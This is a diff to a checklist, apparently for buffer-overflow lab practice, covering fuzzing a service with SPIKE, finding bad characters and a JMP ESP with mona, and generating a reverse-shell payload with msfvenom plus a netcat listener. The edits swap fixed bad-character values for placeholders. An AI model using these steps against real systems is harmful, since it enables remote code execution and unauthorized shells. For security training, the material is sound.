@@ -10,7 +10,7 @@ In Immunity's command bar, once:
 
 ## Find the command that crashes
 nc <TargetIP> <Port>
-- [ ] HELP or the banner lists the commands; THE-COMMAND below is the one under test, with its trailing space
+- [ ] HELP or the banner lists the commands; THE-COMMAND below is the one under test, without the space after it
 One SPIKE script per command, until one crashes with EIP 41414141:
 cat > cmd.spk <<'EOF'
 s_readline();
@@ -73,13 +73,13 @@ After the crash, with the address ESP holds:
 !mona compare -f c:\mona\THE-PROGRAM\bytearray.bin -a THE-ESP
 - [ ] Possibly bad chars 07 08: usually only the first of a pair is bad
 Then one more out of both lists, restart, send, compare:
-!mona bytearray -b "\x00\x07"
-python3 -c 'bad = [0x00, 0x07]; open("chars.bin", "wb").write(bytes(b for b in range(256) if b not in bad))'
+!mona bytearray -b "THE-BAD-CHARS"
+python3 -c 'bad = [THE-BAD-BYTES]; open("chars.bin", "wb").write(bytes(b for b in range(256) if b not in bad))'
 - [ ] Repeated until mona says Unmodified, one byte at a time
-- [ ] The final list written down, such as \x00\x07\x2e\xa0, for the next two steps
+- [ ] The list so far written as THE-BAD-CHARS, such as \x00\x07, and as THE-BAD-BYTES, such as 0x00, 0x07
 
 ## A JMP ESP
-!mona jmp -r esp -cpb "\x00\x07\x2e\xa0"
+!mona jmp -r esp -cpb "THE-BAD-CHARS"
 - [ ] Results in the Log window, Alt+L: a module with ASLR False and Rebase False
 - [ ] Its address, eight hex digits with no 0x, is my JmpAddress
 Or by hand, in one module from the list:
@@ -87,7 +87,7 @@ Or by hand, in one module from the list:
 !mona find -s "\xff\xe4" -m THE-MODULE
 
 ## The exploit
-msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b "\x00\x07\x2e\xa0" -f raw -o shell.bin
+msfvenom -p windows/shell_reverse_tcp LHOST=<LHOST> LPORT=<LPORT> EXITFUNC=thread -b "THE-BAD-CHARS" -f raw -o shell.bin
 rlwrap nc -lvnp <LPORT>
 python3 bof.py <Offset> <JmpAddress> shell.bin 16
 - [ ] -b lists every bad character, \x00 included
